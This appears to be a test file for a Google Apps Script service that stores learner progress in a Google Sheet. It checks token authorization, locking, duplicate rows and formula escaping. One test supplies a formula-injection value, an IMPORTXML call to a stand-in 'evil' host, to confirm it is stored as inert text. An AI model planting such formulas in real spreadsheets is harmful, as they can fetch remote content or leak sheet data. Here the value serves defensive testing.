import { readFileSync } from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { test, expect } from '../support/test';

const root = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '../..');
const source = readFileSync(path.join(root, 'server/sheets/Progress.gs'), 'utf8');
const { rowFromProgress, progressFromRow, emptyProgress } = new Function(
  `${source}; return { rowFromProgress, progressFromRow, emptyProgress };`,
)() as {
  rowFromProgress: (sub: string, progress: Record<string, unknown>) => unknown[];
  progressFromRow: (row: unknown[]) => Record<string, unknown>;
  emptyProgress: () => Record<string, unknown>;
};

function harness(properties: Record<string, string | null>) {
  const globals = `
    var PropertiesService = {
      getScriptProperties: function () {
        return { getProperty: function (k) { return ${JSON.stringify(properties)}[k] || null; } };
      },
    };
  `;
  const built = new Function(
    `${globals}; ${source}; return { authorized: authorized, rowIndexFor: rowIndexFor, untext: untext };`,
  )() as {
    authorized: (body: unknown) => boolean;
    rowIndexFor: (tab: unknown, sub: string) => number;
    untext: (v: unknown) => string;
  };
  return {
    // The token now travels in the parsed POST body (`body.token`), not a
    // query-string parameter — see the fix-round-1 report for why.
    authorizedWith: (token: string) => built.authorized({ token }),
    rowIndexForIn: (column: string[][], sub: string) =>
      built.rowIndexFor(
        {
          getLastRow: () => column.length + 1,
          getRange: () => ({ getValues: () => column }),
        },
        sub,
      ),
  };
}

/**
 * `doPost` needs its own harness: it touches `LockService`, `SpreadsheetApp`
 * and `ContentService`, and the lock/write assertions below need real call
 * tracking, not just data a mock can report back — so this passes live JS
 * objects into the built function instead of splicing JSON into the source.
 */
function harnessDoPost(options: {
  properties?: Record<string, string | null>;
  tryLockResult?: boolean;
  rows?: unknown[][];
}) {
  const properties = options.properties ?? { ACADEMY_TOKEN: 't'.repeat(40) };
  const tryLockResult = options.tryLockResult ?? true;
  const rows: unknown[][] = (options.rows ?? []).map(row => [...row]);

  const released = { called: false };
  const lockCalls = { tryLock: 0 };
  const appendCalls: unknown[][] = [];
  const setValuesCalls: { row: number; values: unknown[][] }[] = [];

  const deps = {
    PropertiesService: {
      getScriptProperties: () => ({
        getProperty: (k: string) => properties[k] ?? null,
      }),
    },
    LockService: {
      getScriptLock: () => ({
        tryLock: () => {
          lockCalls.tryLock += 1;
          return tryLockResult;
        },
        releaseLock: () => {
          released.called = true;
        },
      }),
    },
    ContentService: {
      MimeType: { JSON: 'application/json' },
      createTextOutput: (contents: string) => ({
        content: contents,
        setMimeType() {
          return this;
        },
      }),
    },
    SpreadsheetApp: {
      getActiveSpreadsheet: () => ({
        getSheetByName: () => ({
          getLastRow: () => rows.length + 1,
          getRange: (row: number, _col: number, _numRows: number, numCols: number) => ({
            getValues: () => {
              // The column scan `rowIndexFor` runs (row 2, one column) versus
              // a single full-row read/write (any row, HEADERS.length columns).
              if (row === 2 && numCols === 1) return rows.map(r => [r[0]]);
              return [rows[row - 2]];
            },
            setValues: (values: unknown[][]) => {
              setValuesCalls.push({ row, values });
              rows[row - 2] = values[0];
            },
          }),
          appendRow: (row: unknown[]) => {
            appendCalls.push(row);
            rows.push(row);
          },
        }),
      }),
    },
  };

  const built = new Function(
    'deps',
    `
      var PropertiesService = deps.PropertiesService;
      var LockService = deps.LockService;
      var ContentService = deps.ContentService;
      var SpreadsheetApp = deps.SpreadsheetApp;
      ${source};
      return { doPost: doPost };
    `,
  )(deps) as { doPost: (e: unknown) => { content: string } };

  return {
    doPostRaw: built.doPost,
    doPostBody: (e: unknown) => JSON.parse(built.doPost(e).content),
    released,
    lockCalls,
    appendCalls,
    setValuesCalls,
  };
}

test('a row round-trips back to the same progress', () => {
  const progress = {
    ...emptyProgress(),
    interviewAnswers: 4,
    practiceCompleted: ['c1', 'c2'],
    lastTool: 'practice',
  };
  expect(progressFromRow(rowFromProgress('123', progress))).toEqual(progress);
});

/**
 * The two lists come from localStorage, which the visitor owns. An id like
 * `=IMPORTXML(...)` written into a cell is a formula Google will evaluate.
 */
test('an id that looks like a formula is stored as text, not evaluated', () => {
  const row = rowFromProgress('123', {
    ...emptyProgress(),
    practiceCompleted: ['=IMPORTXML("http://evil","//a")'],
  });
  row.forEach(cell => {
    if (typeof cell === 'string' && cell.length > 0) {
      expect(cell.startsWith('=')).toBe(false);
    }
  });
});

test('a sub that looks like a formula is stored as text', () => {
  const row = rowFromProgress('=1+1', emptyProgress());
  expect(row[0]).toBe("'=1+1");
});

/** The web app is deployed "anyone with the link": the token is the only guard. */
test('an absent script token refuses every caller', () => {
  const { authorizedWith } = harness({ ACADEMY_TOKEN: null });
  expect(authorizedWith('')).toBe(false);
  expect(authorizedWith('t'.repeat(40))).toBe(false);
});

test('a short script token is refused rather than trusted', () => {
  const { authorizedWith } = harness({ ACADEMY_TOKEN: 'short' });
  expect(authorizedWith('short')).toBe(false);
});

test('only the exact token is accepted', () => {
  const token = 't'.repeat(40);
  const { authorizedWith } = harness({ ACADEMY_TOKEN: token });
  expect(authorizedWith(token)).toBe(true);
  expect(authorizedWith('x'.repeat(40))).toBe(false);
  expect(authorizedWith(token.slice(0, 39))).toBe(false);
});

/** A hand-edited sheet can hold two rows for one sub. Picking one silently
 *  would write a merge into a row the next read might not find. */
test('duplicate rows for one sub are an error, not a coin toss', () => {
  const { rowIndexForIn } = harness({});
  expect(() => rowIndexForIn([['123'], ['456'], ['123']], '123')).toThrow();
  expect(rowIndexForIn([['456'], ['123']], '123')).toBe(3);
  expect(rowIndexForIn([['456']], '123')).toBe(-1);
});

const TOKEN = 't'.repeat(40);

/**
 * The lock is the only thing standing between two concurrent syncs and a
 * corrupted row — it is the entire reason this uses Apps Script instead of
 * the Sheets REST API, so a lock that is not granted must never be treated
 * as though it were.
 */
test('a lock that is not granted refuses the write rather than falling through', () => {
  const { doPostBody, appendCalls, setValuesCalls, released, lockCalls } = harnessDoPost({
    tryLockResult: false,
  });
  const body = doPostBody({
    postData: {
      contents: JSON.stringify({
        token: TOKEN,
        sub: '123',
        progress: { ...emptyProgress(), resumeStarted: true },
      }),
    },
  });
  expect(body).toEqual({ error: 'busy' });
  expect(appendCalls).toHaveLength(0);
  expect(setValuesCalls).toHaveLength(0);
  expect(lockCalls.tryLock).toBe(1);
  // The lock was never granted, so there is nothing to release.
  expect(released.called).toBe(false);
});

test('the lock is released even when the locked work throws', () => {
  const { doPostRaw, released } = harnessDoPost({
    // Two rows for '123' makes rowIndexFor throw once inside the try block —
    // a stand-in for any failure that can happen mid-write, proving the
    // finally protects the lock regardless of cause.
    rows: [['123'], ['456'], ['123']],
  });
  const e = {
    postData: {
      contents: JSON.stringify({ token: TOKEN, sub: '123', progress: emptyProgress() }),
    },
  };
  expect(() => doPostRaw(e)).toThrow();
  expect(released.called).toBe(true);
});

test('a load for an unknown sub returns empty progress and writes nothing', () => {
  const { doPostBody, appendCalls, setValuesCalls, released } = harnessDoPost({ rows: [] });
  const body = doPostBody({
    postData: { contents: JSON.stringify({ token: TOKEN, sub: 'never-seen', op: 'load' }) },
  });
  expect(body).toEqual({ progress: emptyProgress() });
  expect(appendCalls).toHaveLength(0);
  expect(setValuesCalls).toHaveLength(0);
  expect(released.called).toBe(true);
});

/**
 * A token in a query string lands in Google's execution logs and any proxy
 * log along the way; the body `doPost` already parses is the only place
 * left for it to travel.
 */
test('a malformed body is refused before the lock is ever touched', () => {
  const { doPostBody, lockCalls } = harnessDoPost({});
  const body = doPostBody({ postData: { contents: '{not valid json' } });
  expect(body).toEqual({ error: 'unauthorized' });
  expect(lockCalls.tryLock).toBe(0);
});

test('only a token carried in the body authorizes the request', () => {
  const { doPostBody } = harnessDoPost({ rows: [] });
  const body = doPostBody({
    postData: { contents: JSON.stringify({ token: 'x'.repeat(40), sub: '123', op: 'load' }) },
  });
  expect(body).toEqual({ error: 'unauthorized' });
});
